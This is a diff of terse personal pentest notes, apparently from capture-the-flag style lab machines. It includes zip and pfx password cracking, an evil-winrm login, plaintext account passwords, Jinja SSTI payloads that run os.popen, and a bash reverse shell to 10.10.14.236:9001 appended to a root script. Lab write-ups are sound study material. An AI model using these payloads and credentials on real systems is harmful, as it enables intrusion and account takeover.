@@ -1,25 +1,22 @@
 ------------------
 NOTES
 ------------------
-fcrackzip -D -u winrm_backup.zip -p /usr/share/wordlists/rockyou.txt
 
 ------------------
 PROCESS
 ------------------
-smbclient to find and open share and recover a locked zip file
-	fcrackzip to recover the password - supremelegacy
 
-able to get a .pfx which we can crack a passwrod with john
-	pfx2john legacyy_dev_auth.pfx > hash
-	john -w=/usr/share/wordlists/rockyou.txt hash
+subdomain which does OCR on images
+Flask = look for ssti
 
-from the pfx file, can pull out a cert and a private key using this blog post:
-	https://tecadmin.net/extract-private-key-and-certificate-files-from-pfx-file/
+ssti on the image
+	rce using payload all the things
 
-finally can authenticate using evil-winrm
-	evil-winrm -S -k key.pem -c cert.pem -i 10.129.133.175
+		{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}
+		{{ self._TemplateReference__context.joiner.__init__.__globals__.os.popen('id').read() }}
+		{{ self._TemplateReference__context.namespace.__init__.__globals__.os.popen('id').read() }}
 
-
-
-svc_deploy:E3R$Q62^12p7PLlC%KWaxuaV
-Administrator:J+3W6gCu.l1wwt/1x2mh[@Fw
+priv esc:
+	have /usr/local/sbin in path, can append to the script running as root
+		echo "bash -i >& /dev/tcp/10.10.14.236/9001 0>&1" >> /usr/local/sbin/ssh-alert.sh
+	ssh in again and have a listener
